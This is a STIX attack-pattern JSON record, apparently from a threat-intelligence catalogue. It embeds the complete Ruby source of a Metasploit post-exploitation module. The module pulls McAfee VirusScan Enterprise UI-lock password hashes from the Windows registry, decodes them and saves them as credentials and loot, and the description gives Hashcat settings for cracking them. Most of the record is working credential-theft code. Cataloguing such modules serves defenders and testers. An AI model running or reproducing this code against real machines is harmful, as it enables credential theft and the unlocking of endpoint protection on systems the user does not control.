{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2f3abcf9-0e43-40c7-9fc4-68b901a78159",
    "created": "2024-08-14T16:33:11.453728Z",
    "modified": "2024-08-14T16:33:11.453732Z",
    "name": "McAfee Virus Scan Enterprise Password Hashes Dump",
    "description": " This module extracts the password hash from McAfee Virus Scan Enterprise (VSE) used to lock down the user interface. Hashcat supports cracking this type of hash using hash type sha1($salt.unicode($pass)) (-m 140) and a hex salt (--hex-salt) of 01000f000d003300 (unicode \"\\x01\\x0f\\x0d\\x33\"). A dynamic",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/mcafee_vse_hashdump.rb",
            "external_id": "mcafee_vse_hashdump.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.dionach.com/blog/disabling-mcafee-on-access-scanning"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Registry\n  include Msf::Auxiliary::Report\n  include Msf::Post::Windows::UserProfiles\n\n  VERSION_5 = Rex::Version.new('5.0')\n  VERSION_6 = Rex::Version.new('6.0')\n  VERSION_8 = Rex::Version.new('8.0')\n  VERSION_9 = Rex::Version.new('9.0')\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'McAfee Virus Scan Enterprise Password Hashes Dump',\n        'Description' => %q{\n          This module extracts the password hash from McAfee Virus Scan Enterprise (VSE)\n          used to lock down the user interface. Hashcat supports cracking this type of\n          hash using hash type sha1($salt.unicode($pass)) (-m 140) and a hex salt\n          (--hex-salt) of 01000f000d003300 (unicode \"\\x01\\x0f\\x0d\\x33\"). A dynamic\n          format is available for John the Ripper at the referenced URL.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Mike Manzotti <mike.manzotti[at]dionach.com>', # Metasploit module\n          'Maurizio inode Agazzini' # original research\n        ],\n        'References' => [\n          ['URL', 'https://www.dionach.com/blog/disabling-mcafee-on-access-scanning']\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ]\n      )\n    )\n  end\n\n  def run\n    print_status(\"Looking for McAfee VSE password hashes on #{sysinfo['Computer']} ...\")\n\n    vse_keys = enum_vse_keys\n    if vse_keys.empty?\n      vprint_error('McAfee VSE not installed or insufficient permissions')\n      return\n    end\n\n    hashes_and_versions = extract_hashes_and_versions(vse_keys)\n    if hashes_and_versions.empty?\n      vprint_error('No McAfee VSE hashes extracted')\n      return\n    end\n    process_hashes_and_versions(hashes_and_versions)\n  end\n\n  def enum_vse_keys\n    vprint_status('Enumerating McAfee VSE installations')\n    keys = []\n    [\n      'HKLM\\\\Software\\\\Wow6432Node\\\\McAfee\\\\DesktopProtection', # 64-bit\n      'HKLM\\\\Software\\\\McAfee\\\\DesktopProtection' # 32-bit\n    ].each do |key|\n      subkeys = registry_enumkeys(key)\n      keys << key unless subkeys.nil?\n    end\n    keys\n  end\n\n  def extract_hashes_and_versions(keys)\n    vprint_status(\"Attempting to extract hashes from #{keys.size} McAfee VSE installations\")\n    hash_map = {}\n    keys.each do |key|\n      hash = registry_getvaldata(key, 'UIPEx')\n      if hash.empty?\n        vprint_error(\"No McAfee VSE password hash found in #{key}\")\n        next\n      end\n\n      version = registry_getvaldata(key, 'szProductVer')\n      if version.empty?\n        vprint_error(\"No McAfee VSE version key found in #{key}\")\n        next\n      end\n      hash_map[hash] = Rex::Version.new(version)\n    end\n    hash_map\n  end\n\n  def process_hashes_and_versions(hashes_and_versions)\n    hashes_and_versions.each do |hash, version|\n      if version >= VERSION_5 && version < VERSION_6\n        hashtype = 'md5u'\n        version_name = 'v5'\n      else\n        # Base64 decode hash\n        hash = Rex::Text.to_hex(Rex::Text.decode_base64(hash), '')\n        hashtype = 'dynamic_1405'\n        version_name = 'v8'\n        unless version >= VERSION_8 && version < VERSION_9\n          print_warning(\"Unknown McAfee VSE version #{version} - Assuming v8\")\n        end\n      end\n\n      print_good(\"McAfee VSE #{version_name} (#{hashtype}) password hash: #{hash}\")\n\n      credential_data = {\n        post_reference_name: refname,\n        origin_type: :session,\n        private_type: :nonreplayable_hash,\n        private_data: hash,\n        session_id: session_db_id,\n        jtr_format: hashtype,\n        workspace_id: myworkspace_id\n      }\n\n      create_credential(credential_data)\n\n      # Store McAfee password hash as loot\n      loot_path = store_loot('mcafee.hash', 'text/plain', session, \"mcafee:#{hash}\", 'mcafee_hashdump.txt', 'McAfee Password Hash')\n      print_good(\"McAfee VSE password hash saved in: #{loot_path}\")\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}